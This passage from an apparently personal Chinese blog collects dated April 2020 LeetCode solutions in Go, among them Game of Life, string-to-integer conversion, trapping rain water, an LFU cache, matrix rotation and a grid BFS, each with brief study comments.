&#123;</span><br><span class="line">					<span class="keyword">if</span> way[x] != <span class="number">0</span> || way[y] != <span class="number">0</span> &#123;</span><br><span class="line">						r := way[x] + i</span><br><span class="line">						c := way[y] + j</span><br><span class="line">						<span class="comment">// check border</span></span><br><span class="line">						<span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; r &lt; row) &amp;&amp; (c &gt;= <span class="number">0</span> &amp;&amp; c &lt; col) &#123;</span><br><span class="line">							<span class="keyword">if</span> abs(board[r][c]) == <span class="number">1</span> &#123;</span><br><span class="line">								aliveNum++</span><br><span class="line">								fmt.Println(aliveNum, i, j)</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// check status</span></span><br><span class="line">			<span class="comment">// alive -&gt;dead</span></span><br><span class="line">			<span class="keyword">if</span> (board[i][j] == <span class="number">1</span>) &amp;&amp; (aliveNum &lt; <span class="number">2</span> || aliveNum &gt; <span class="number">3</span>) &#123;</span><br><span class="line">				board[i][j] = <span class="number">-1</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// dead -&gt;alive</span></span><br><span class="line">			<span class="keyword">if</span> (board[i][j] == <span class="number">0</span>) &amp;&amp; (aliveNum == <span class="number">3</span>) &#123;</span><br><span class="line">				board[i][j] = <span class="number">2</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> board[i][j] &gt; <span class="number">0</span> &#123;</span><br><span class="line">				board[i][j] = <span class="number">1</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				board[i][j] = <span class="number">0</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生命游戏，第一眼觉得是个图题，后来才知道主要是为了练符合状态</span></span><br><span class="line"><span class="comment">// 需要变化的是结点本身的状态，改变依据是周围结点的状态</span></span><br><span class="line"><span class="comment">// 硬做的话提前备份一个二维数组就好，尝试一下原地算法</span></span><br><span class="line"><span class="comment">// 原地算法不依赖额外的资源或者依赖少数的额外资源，仅依靠输出来覆盖输入的一种算法操作。</span></span><br><span class="line"><span class="comment">// 需要对改变后的数组状态做一些新的标记，来避免与0/1状态混淆</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">alive-&gt;dead :-1</span></span><br><span class="line"><span class="comment">alive-&gt;alive :1</span></span><br><span class="line"><span class="comment">dead-&gt;alive :2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> board = <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">	temp := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	fmt.Println(board)</span><br><span class="line">	gameOfLife(board)</span><br><span class="line">	fmt.Println(board)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-3"><a href="#2020-4-3" class="headerlink" title="2020/4/3"></a>2020/4/3</h3><h4 id="leetcode-8-字符串转换整数-Go"><a href="#leetcode-8-字符串转换整数-Go" class="headerlink" title="leetcode 8. 字符串转换整数_Go"></a>leetcode 8. 字符串转换整数_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;unicode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动机什么的是学不会的，但各种情况的逻辑判断需要好好锻炼</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAtoi</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	flag := <span class="number">1</span></span><br><span class="line">	<span class="comment">// 按找空白符分割字符串成一个切片</span></span><br><span class="line">	strSlice := strings.FieldsFunc(str, unicode.IsSpace)</span><br><span class="line">	<span class="comment">//fmt.Println(strSlice, reflect.TypeOf(strSlice))</span></span><br><span class="line">	<span class="comment">// 分割后只需要判断切片内第一个元素即可</span></span><br><span class="line">	<span class="keyword">var</span> temp <span class="keyword">string</span></span><br><span class="line">	<span class="comment">// 防止输入&quot;&quot;</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strSlice) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !unicode.IsDigit(<span class="keyword">rune</span>(strSlice[<span class="number">0</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">		<span class="keyword">if</span> strSlice[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;+&#x27;</span> &#123;</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			strSlice[<span class="number">0</span>] = strSlice[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">			<span class="comment">//fmt.Println(strSlice[0])</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strSlice[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span> &#123;</span><br><span class="line">			flag = <span class="number">-1</span></span><br><span class="line">			strSlice[<span class="number">0</span>] = strSlice[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	first := strSlice[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(first); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> !unicode.IsDigit(<span class="keyword">rune</span>(first[i])) &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			temp += <span class="keyword">string</span>(first[i])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// strToNum</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(temp); i++ &#123;</span><br><span class="line">		ans = <span class="keyword">int</span>(temp[i]-<span class="string">&#x27;0&#x27;</span>) + ans*<span class="number">10</span></span><br><span class="line">		<span class="keyword">if</span> ans*flag &gt; math.MaxInt32 &#123;</span><br><span class="line">			<span class="keyword">return</span> math.MaxInt32</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ans*flag &lt; math.MinInt32 &#123;</span><br><span class="line">			<span class="keyword">return</span> math.MinInt32</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag * ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//str := &quot;-996 9k3 and 987&quot;</span></span><br><span class="line">	<span class="comment">//str2 := &quot;words and 987&quot;</span></span><br><span class="line">	str3 := <span class="string">&quot;-91283472332&quot;</span></span><br><span class="line">	fmt.Println(myAtoi(str3))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-4"><a href="#2020-4-4" class="headerlink" title="2020/4/4"></a>2020/4/4</h3><h4 id="leetcode-42-接雨水-Go"><a href="#leetcode-42-接雨水-Go" class="headerlink" title="leetcode 42. 接雨水_Go"></a>leetcode 42. 接雨水_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴力思维：两边最大高度的较小值减去当前高度的值</span></span><br><span class="line"><span class="comment">// 但暴力不可取，还是不暴力了……</span></span><br><span class="line"><span class="comment">// 题解里那个栈的应用是真的没想到，tcl</span></span><br><span class="line"><span class="comment">// 用two pointers来解决</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trap</span><span class="params">(height []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	left := <span class="number">0</span></span><br><span class="line">	right := <span class="built_in">len</span>(height) - <span class="number">1</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	leftMax, rightMax := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		<span class="keyword">if</span> height[left] &lt; height[right] &#123;</span><br><span class="line">			<span class="keyword">if</span> height[left] &gt;= leftMax &#123;</span><br><span class="line">				leftMax = height[left]</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				ans += leftMax - height[left]</span><br><span class="line">			&#125;</span><br><span class="line">			left++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> height[right] &gt;= rightMax &#123;</span><br><span class="line">				rightMax = height[right]</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				ans += rightMax - height[right]</span><br><span class="line">			&#125;</span><br><span class="line">			right--</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	height := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>&#125;</span><br><span class="line">	fmt.Println(trap(height))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-5"><a href="#2020-4-5" class="headerlink" title="2020/4/5"></a>2020/4/5</h3><h4 id="leetcode-460-LFU缓存-Go"><a href="#leetcode-460-LFU缓存-Go" class="headerlink" title="leetcode 460. LFU缓存_Go"></a>leetcode 460. LFU缓存_Go</h4><p>真难……</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Node struct</span></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">	key, value <span class="keyword">int</span></span><br><span class="line">	num        <span class="keyword">int</span>   <span class="comment">// 调用次数</span></span><br><span class="line">	prev, next *Node <span class="comment">// 前序，后继指针，为双重链表做准备</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DoubleList prepare for freeList</span></span><br><span class="line"><span class="keyword">type</span> DoubleList <span class="keyword">struct</span> &#123;</span><br><span class="line">	head, tail *Node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ConstructorDB init</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConstructorDB</span><span class="params">()</span> *<span class="title">DoubleList</span></span> &#123;</span><br><span class="line">	head, tail := &amp;Node&#123;&#125;, &amp;Node&#123;&#125;</span><br><span class="line">	head.next, tail.prev = tail, head</span><br><span class="line">	<span class="keyword">return</span> &amp;DoubleList&#123;</span><br><span class="line">		head: head,</span><br><span class="line">		tail: tail,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LFUCache struct</span></span><br><span class="line"><span class="keyword">type</span> LFUCache <span class="keyword">struct</span> &#123;</span><br><span class="line">	capacity <span class="keyword">int</span></span><br><span class="line">	rest     <span class="keyword">int</span> <span class="comment">// 剩余容量</span></span><br><span class="line">	minFreq  <span class="keyword">int</span> <span class="comment">// 当前最少num</span></span><br><span class="line">	cache    <span class="keyword">map</span>[<span class="keyword">int</span>]*Node</span><br><span class="line">	freqList <span class="keyword">map</span>[<span class="keyword">int</span>]*DoubleList <span class="comment">// key是调用的num，每个建对应的值是一个链表,越靠近头结点调用的越近</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructor init</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">(capacity <span class="keyword">int</span>)</span> <span class="title">LFUCache</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> LFUCache&#123;</span><br><span class="line">		capacity: capacity,</span><br><span class="line">		rest:     capacity,</span><br><span class="line">		cache:    <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]*Node),</span><br><span class="line">		freqList: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]*DoubleList),</span><br><span class="line">		minFreq:  <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove node from DoubleList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">Remove</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	node.prev.next = node.next</span><br><span class="line">	node.next.prev = node.prev</span><br><span class="line">	node.next = <span class="literal">nil</span></span><br><span class="line">	node.prev = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IsEmpty -&gt; Judge if DoubleList is empty</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">IsEmpty</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.head.next == p.tail</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddNode -&gt; add node to doubleList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">AddNode</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	node.next = p.head.next</span><br><span class="line">	node.prev = p.head</span><br><span class="line">	p.head.next.prev = node</span><br><span class="line">	p.head.next = node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UpdateFre freeList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">UpdateFre</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	freq := node.num</span><br><span class="line">	p.freqList[freq].Remove(node)</span><br><span class="line">	<span class="comment">// Judge if its num is min</span></span><br><span class="line">	<span class="keyword">if</span> p.minFreq == freq &amp;&amp; p.freqList[freq].IsEmpty() &#123;</span><br><span class="line">		p.minFreq++</span><br><span class="line">		<span class="built_in">delete</span>(p.freqList, freq)</span><br><span class="line">	&#125;</span><br><span class="line">	node.num++</span><br><span class="line">	<span class="keyword">if</span> p.freqList[node.num] == <span class="literal">nil</span> &#123;</span><br><span class="line">		p.freqList[node.num] = ConstructorDB()</span><br><span class="line">	&#125;</span><br><span class="line">	p.freqList[node.num].AddNode(node)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get output</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">Get</span><span class="params">(key <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	node, ok := p.cache[key]</span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		p.UpdateFre(node)</span><br><span class="line">		<span class="keyword">return</span> node.value</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoveLast -&gt; remove last node</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">RemoveLast</span><span class="params">()</span> *<span class="title">Node</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p.IsEmpty() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	last := p.tail.prev</span><br><span class="line">	p.Remove(last)</span><br><span class="line">	<span class="keyword">return</span> last</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Put input</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">Put</span><span class="params">(key <span class="keyword">int</span>, value <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p.capacity == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	node, ok := p.cache[key]</span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		node.value = value</span><br><span class="line">		p.UpdateFre(node)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.rest == <span class="number">0</span> &#123;</span><br><span class="line">			node := p.freqList[p.minFreq].RemoveLast()</span><br><span class="line">			<span class="built_in">delete</span>(p.cache, node.key)</span><br><span class="line">			p.rest++</span><br><span class="line">		&#125;</span><br><span class="line">		temp := &amp;Node&#123;key: key, value: value, num: <span class="number">1</span>&#125;</span><br><span class="line">		p.cache[key] = temp</span><br><span class="line">		<span class="keyword">if</span> p.freqList[<span class="number">1</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">			p.freqList[<span class="number">1</span>] = ConstructorDB()</span><br><span class="line">		&#125;</span><br><span class="line">		p.freqList[<span class="number">1</span>].AddNode(temp)</span><br><span class="line">		p.minFreq = <span class="number">1</span></span><br><span class="line">		p.rest--</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cache := Constructor(<span class="number">2</span>)</span><br><span class="line">	cache.Put(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">	cache.Put(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(cache.Get(<span class="number">1</span>)) <span class="comment">// 返回 1</span></span><br><span class="line">	cache.Put(<span class="number">3</span>, <span class="number">3</span>)           <span class="comment">// 去除 key 2</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">2</span>)) <span class="comment">// 返回 -1 (未找到key 2)</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">3</span>)) <span class="comment">// 返回 3</span></span><br><span class="line">	cache.Put(<span class="number">4</span>, <span class="number">4</span>)           <span class="comment">// 去除 key 1</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">1</span>)) <span class="comment">// 返回 -1 (未找到 key 1)</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">3</span>)) <span class="comment">// 返回 3</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">4</span>)) <span class="comment">// 返回 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-6"><a href="#2020-4-6" class="headerlink" title="2020/4/6"></a>2020/4/6</h3><p>今天的每日一题我直接放弃了，做之前简单的吧……</p>
<h4 id="leetcode-1013-将数组分成相等的三个部分-Go"><a href="#leetcode-1013-将数组分成相等的三个部分-Go" class="headerlink" title="leetcode 1013. 将数组分成相等的三个部分_Go"></a>leetcode 1013. 将数组分成相等的三个部分_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">canThreePartsEqualSum</span><span class="params">(A []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(A); i++ &#123;</span><br><span class="line">		sum += A[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> sum%<span class="number">3</span> != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	target := sum / <span class="number">3</span></span><br><span class="line">	idx, sumTemp := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> idx &lt; <span class="built_in">len</span>(A) &#123;</span><br><span class="line">		sumTemp += A[idx]</span><br><span class="line">		<span class="keyword">if</span> sumTemp == target &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		idx++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> sumTemp != target &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	idx++</span><br><span class="line">	<span class="keyword">for</span> idx+<span class="number">1</span> &lt; <span class="built_in">len</span>(A) &#123; <span class="comment">// 满足最后一部分非空</span></span><br><span class="line">		sumTemp += A[idx]</span><br><span class="line">		<span class="keyword">if</span> sumTemp == <span class="number">2</span>*target &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		idx++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	A := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-6</span>, <span class="number">6</span>, <span class="number">-7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">	fmt.Println(canThreePartsEqualSum(A))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-7"><a href="#2020-4-7" class="headerlink" title="2020/4/7"></a>2020/4/7</h3><h4 id="leetcode-面试题-01-07-旋转矩阵-Go"><a href="#leetcode-面试题-01-07-旋转矩阵-Go" class="headerlink" title="leetcode 面试题 01.07. 旋转矩阵_Go"></a>leetcode 面试题 01.07. 旋转矩阵_Go</h4><p>我自己本身没有去纠结原地算法，我觉得这一题让我进一步了解copy这个机制已经有收获了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rotate</span><span class="params">(matrix [][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(matrix)</span><br><span class="line">	ans := <span class="built_in">make</span>([][]<span class="keyword">int</span>, length)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		ans[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, length)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; length; j++ &#123;</span><br><span class="line">			ans[j][length-i<span class="number">-1</span>] = matrix[i][j]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">copy</span>(matrix, ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	matrix := [][]<span class="keyword">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;,</span><br><span class="line">		&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,</span><br><span class="line">		&#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	rotate(matrix)</span><br><span class="line">	fmt.Println(matrix)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-8"><a href="#2020-4-8" class="headerlink" title="2020/4/8"></a>2020/4/8</h3><h4 id="leetcode-面试题13-机器人的运动范围-Go"><a href="#leetcode-面试题13-机器人的运动范围-Go" class="headerlink" title="leetcode 面试题13. 机器人的运动范围_Go"></a>leetcode 面试题13. 机器人的运动范围_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addNum</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> a &gt; <span class="number">0</span> &#123;</span><br><span class="line">		ans += a % <span class="number">10</span></span><br><span class="line">		a /= <span class="number">10</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judge</span><span class="params">(row, col, m, n, k <span class="keyword">int</span>, visit [][]<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> row &lt; <span class="number">0</span> || row &gt;= m &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> col &lt; <span class="number">0</span> || col &gt;= n &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> visit[row][col] == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	visit[row][col] = <span class="number">1</span></span><br><span class="line">	ans := addNum(row) + addNum(col)</span><br><span class="line">	<span class="keyword">return</span> ans &lt;= k</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">movingCount</span><span class="params">(m <span class="keyword">int</span>, n <span class="keyword">int</span>, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	visit := <span class="built_in">make</span>([][]<span class="keyword">int</span>, m)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; m; i++ &#123;</span><br><span class="line">		visit[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, n)</span><br><span class="line">	&#125;</span><br><span class="line">	num := <span class="number">0</span></span><br><span class="line">	<span class="comment">// init queue</span></span><br><span class="line">	queue := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	temp := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">	visit[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">	<span class="comment">// BFS</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) != <span class="number">0</span> &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		num++</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>]<span class="number">-1</span>, top[<span class="number">1</span>], m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>] - <span class="number">1</span>, top[<span class="number">1</span>]&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>]+<span class="number">1</span>, top[<span class="number">1</span>], m, n, k, visit) 